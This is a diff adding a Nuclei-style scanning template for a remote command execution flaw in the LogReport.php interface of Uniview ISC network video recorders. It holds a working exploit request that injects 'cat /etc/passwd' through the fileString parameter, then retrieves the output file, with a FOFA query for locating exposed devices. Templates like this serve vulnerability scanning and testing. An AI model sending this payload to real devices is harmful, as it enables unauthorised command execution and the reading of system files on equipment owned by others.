@@ -1,0 +1,34 @@
+id: yushi-isc-logreport-rce
+
+info:
+  name: yushi-isc-logreport-rce
+  author: unknow
+  severity: high
+  description: 浙江宇视 isc 网络视频录像机 LogReport.php 存在远程命令执行漏洞
+  tags: yushi,rce
+  metadata:
+    fofa-qeury: body="Alarm" && body="白牌定制"
+    veified: true
+    max-request: 2
+
+http:
+  - raw:
+      - |              
+        GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bcat%20/etc/passwd%3e{{rce}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
+      
+      - |              
+        GET /Interface/LogReport/{{rce}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36       
+
+    payloads:
+      rce:
+        - "qwer123.txt"
+               
+    matchers:     
+      - type: dsl
+        name: rce
+        dsl:
+          - "status_code_1 == 200 && contains(body,'root:x') && contains(header,'text/plain')"
